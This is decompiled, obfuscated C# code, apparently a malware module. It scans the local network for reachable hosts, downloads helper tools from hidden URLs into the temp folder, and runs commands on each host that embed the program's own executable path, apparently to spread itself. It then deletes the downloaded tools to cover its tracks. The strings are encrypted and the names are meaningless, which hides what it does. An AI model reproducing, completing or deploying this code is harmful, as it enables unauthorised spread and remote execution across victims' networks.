using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace xNvWsvlcqg;

internal sealed class mFpDoNjNYAxvQ
{
	private sealed class FrLcencHJSkqn
	{
		public string QDdoSIfAwAvP;

		public string laWSQXzCto;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107354615)) && !string_0.StartsWith(getString_0(107354578)) && !string_0.StartsWith(getString_0(107354569)) && !string_0.Contains(getString_0(107358990))) || !jyWTgAoYScCU(string_0))
			{
				return;
			}
			if (BhIlEyPUpxxiJj.EDqFOkaghIrY == getString_0(107396862))
			{
				for (int i = 0; i < AruVfEVeessewvu.Count; i++)
				{
					if (BhIlEyPUpxxiJj.eFeDYmeSGLbP)
					{
						if (File.Exists(QDdoSIfAwAvP))
						{
							BhIlEyPUpxxiJj.etzKuRpsiGLAb(QDdoSIfAwAvP, getString_0(107358332) + string_0 + getString_0(107367828) + AruVfEVeessewvu[i] + getString_0(107367787) + opstXIlPmLH[i] + getString_0(107367810) + Assembly.GetEntryAssembly()!.Location + getString_0(107358286));
						}
					}
					else if (File.Exists(laWSQXzCto))
					{
						BhIlEyPUpxxiJj.etzKuRpsiGLAb(laWSQXzCto, getString_0(107358332) + string_0 + getString_0(107367828) + AruVfEVeessewvu[i] + getString_0(107367787) + opstXIlPmLH[i] + getString_0(107367777) + Assembly.GetEntryAssembly()!.Location + getString_0(107358286));
					}
				}
			}
			else if (BhIlEyPUpxxiJj.eFeDYmeSGLbP)
			{
				if (File.Exists(QDdoSIfAwAvP))
				{
					BhIlEyPUpxxiJj.etzKuRpsiGLAb(QDdoSIfAwAvP, getString_0(107358332) + string_0 + getString_0(107367688) + Assembly.GetEntryAssembly()!.Location + getString_0(107358286));
				}
			}
			else if (File.Exists(laWSQXzCto))
			{
				BhIlEyPUpxxiJj.etzKuRpsiGLAb(laWSQXzCto, getString_0(107358332) + string_0 + getString_0(107367655) + Assembly.GetEntryAssembly()!.Location + getString_0(107358286));
			}
		}

		static FrLcencHJSkqn()
		{
			Strings.CreateGetStringDelegate(typeof(FrLcencHJSkqn));
		}
	}

	public static List<string> TjKmvIJVVRQUX;

	public static string TlzxkhwAGMCSf;

	public static List<string> AruVfEVeessewvu;

	public static List<string> opstXIlPmLH;

	public static List<string> trjwFisDknblU;

	public List<string> BfisHrVLDLjrS = new List<string>();

	public List<string> lETzvLfOOanPnCaD = new List<string>();

	public List<string> cTGHFxabHfGFCJ = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void falGMktDsqGE()
	{
		FrLcencHJSkqn CS_0024_003C_003E8__locals0 = new FrLcencHJSkqn();
		BhIlEyPUpxxiJj.TogIVruCznP();
		List<fjCcdnCUyHPIG> list = fjCcdnCUyHPIG.eIGgvhvzrtmwf();
		foreach (fjCcdnCUyHPIG item in list)
		{
			TjKmvIJVVRQUX.Add(item.IPAddress);
		}
		if (BhIlEyPUpxxiJj.AsKcCenLzifdW.Count > 0)
		{
			TjKmvIJVVRQUX = TjKmvIJVVRQUX.Union(BhIlEyPUpxxiJj.AsKcCenLzifdW).ToList();
		}
		CS_0024_003C_003E8__locals0.QDdoSIfAwAvP = getString_0(107358987);
		CS_0024_003C_003E8__locals0.laWSQXzCto = getString_0(107358987);
		try
		{
			CS_0024_003C_003E8__locals0.QDdoSIfAwAvP = uzyDkHcomS();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.laWSQXzCto = EuLJLFbXtH();
		}
		catch
		{
		}
		foreach (fjCcdnCUyHPIG item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107354612)) || item2.IPAddress.StartsWith(getString_0(107354575)) || item2.IPAddress.StartsWith(getString_0(107354566)) || item2.IPAddress.Contains(getString_0(107358987)))
				{
					AqzpGXxFomUpaj.GPypdrzEoRyA(item2.MacAddress, item2.IPAddress, getString_0(107368125));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(TjKmvIJVVRQUX, delegate(string string_0)
			{
				if ((string_0.StartsWith(FrLcencHJSkqn.getString_0(107354615)) || string_0.StartsWith(FrLcencHJSkqn.getString_0(107354578)) || string_0.StartsWith(FrLcencHJSkqn.getString_0(107354569)) || string_0.Contains(FrLcencHJSkqn.getString_0(107358990))) && jyWTgAoYScCU(string_0))
				{
					if (BhIlEyPUpxxiJj.EDqFOkaghIrY == FrLcencHJSkqn.getString_0(107396862))
					{
						for (int i = 0; i < AruVfEVeessewvu.Count; i++)
						{
							if (BhIlEyPUpxxiJj.eFeDYmeSGLbP)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.QDdoSIfAwAvP))
								{
									BhIlEyPUpxxiJj.etzKuRpsiGLAb(CS_0024_003C_003E8__locals0.QDdoSIfAwAvP, FrLcencHJSkqn.getString_0(107358332) + string_0 + FrLcencHJSkqn.getString_0(107367828) + AruVfEVeessewvu[i] + FrLcencHJSkqn.getString_0(107367787) + opstXIlPmLH[i] + FrLcencHJSkqn.getString_0(107367810) + Assembly.GetEntryAssembly()!.Location + FrLcencHJSkqn.getString_0(107358286));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.laWSQXzCto))
							{
								BhIlEyPUpxxiJj.etzKuRpsiGLAb(CS_0024_003C_003E8__locals0.laWSQXzCto, FrLcencHJSkqn.getString_0(107358332) + string_0 + FrLcencHJSkqn.getString_0(107367828) + AruVfEVeessewvu[i] + FrLcencHJSkqn.getString_0(107367787) + opstXIlPmLH[i] + FrLcencHJSkqn.getString_0(107367777) + Assembly.GetEntryAssembly()!.Location + FrLcencHJSkqn.getString_0(107358286));
							}
						}
					}
					else if (BhIlEyPUpxxiJj.eFeDYmeSGLbP)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.QDdoSIfAwAvP))
						{
							BhIlEyPUpxxiJj.etzKuRpsiGLAb(CS_0024_003C_003E8__locals0.QDdoSIfAwAvP, FrLcencHJSkqn.getString_0(107358332) + string_0 + FrLcencHJSkqn.getString_0(107367688) + Assembly.GetEntryAssembly()!.Location + FrLcencHJSkqn.getString_0(107358286));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.laWSQXzCto))
					{
						BhIlEyPUpxxiJj.etzKuRpsiGLAb(CS_0024_003C_003E8__locals0.laWSQXzCto, FrLcencHJSkqn.getString_0(107358332) + string_0 + FrLcencHJSkqn.getString_0(107367655) + Assembly.GetEntryAssembly()!.Location + FrLcencHJSkqn.getString_0(107358286));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.QDdoSIfAwAvP))
			{
				File.Delete(CS_0024_003C_003E8__locals0.QDdoSIfAwAvP);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.laWSQXzCto))
			{
				File.Delete(CS_0024_003C_003E8__locals0.laWSQXzCto);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string uzyDkHcomS()
	{
		if (IntPtr.Size == 8)
		{
			return hhlxJgCQAvukd(new Uri(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368584))));
		}
		return hhlxJgCQAvukd(new Uri(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368584))));
	}

	public static string EuLJLFbXtH()
	{
		if (IntPtr.Size == 8)
		{
			return hhlxJgCQAvukd(new Uri(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368535))));
		}
		return hhlxJgCQAvukd(new Uri(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368426))));
	}

	public static bool jyWTgAoYScCU(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string hhlxJgCQAvukd(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107368353), getString_0(107358987)).Remove(0, 3) + getString_0(107368380);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static mFpDoNjNYAxvQ()
	{
		Strings.CreateGetStringDelegate(typeof(mFpDoNjNYAxvQ));
		TjKmvIJVVRQUX = new List<string>();
		TlzxkhwAGMCSf = getString_0(107358987);
		AruVfEVeessewvu = new List<string> { getString_0(107368371) };
		opstXIlPmLH = new List<string> { getString_0(107367814) };
		trjwFisDknblU = new List<string>();
	}
}
